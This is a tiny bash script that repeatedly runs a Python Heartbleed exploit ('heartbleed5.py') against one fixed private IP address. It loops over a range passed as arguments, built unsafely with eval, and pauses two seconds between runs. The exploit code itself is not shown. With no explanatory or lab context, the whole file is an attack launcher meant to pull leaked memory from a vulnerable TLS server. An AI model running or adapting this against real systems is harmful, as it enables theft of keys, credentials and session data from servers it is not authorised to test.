#!/bin/bash


for i in $(eval echo {$1..$2})
do
sleep 2 

python heartbleed5.py 10.176.147.83
python heartbleed5.py 10.176.147.83

done
